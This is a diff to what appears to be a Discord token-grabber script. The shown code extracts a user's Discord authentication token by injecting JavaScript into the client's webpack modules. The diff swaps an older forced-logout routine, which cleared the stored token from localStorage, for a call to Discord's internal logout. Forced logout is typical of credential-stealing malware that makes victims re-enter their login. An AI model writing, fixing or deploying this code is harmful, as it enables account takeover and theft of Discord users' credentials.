@@ -37,9 +37,6 @@ const CONFIG = {
         ],
     },
     API: "https://discord.com/api/v9/users/@me",
-    logout: {
-        urls =  '/auth/logout',
-    },
     badges: {
         Discord_Emloyee: {
             Value: 1,
@@ -120,13 +117,11 @@ const clearAllUserData = () => {
 };
 
 const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-const logout = async () => await excuteJS(`    setInterval(() => {
-        document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.token = `""`
-    }, 50);
-    setTimeout(() => {
-        location.reload();
-    }, 2500);`);
-
+const logout = async () => await executeJS(`
+    (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
+    .find(m => m?.exports?.default?.logout !== void 0)
+    .exports.default.logout();
+`);
 await logout();
 const request = async (method, url, headers, data) => {
     url = new URL(url);
